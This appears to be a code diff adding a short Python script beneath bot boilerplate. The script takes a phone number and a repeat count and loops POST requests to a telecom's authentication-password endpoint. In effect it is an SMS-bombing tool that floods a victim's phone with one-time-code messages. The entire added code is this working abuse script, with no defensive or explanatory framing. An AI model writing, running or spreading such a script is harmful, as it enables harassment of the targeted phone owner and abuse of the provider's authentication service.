@@ -18,3 +18,11 @@ r = redis.from_url(os.environ.get("REDIS_URL"))
 # bot = telebot.TeleBot(token)
 # some_api = some_api_lib.connect(some_api_token)
 #              ...
+
+import requests
+num = input("Enter phone number:")
+n = int(input("How many times:"))
+
+paramss={"phone":num}
+for i in range(0,n):
+	requests.post("https://cms.ntc.net.np/api/generateAuthPassword",params=paramss)
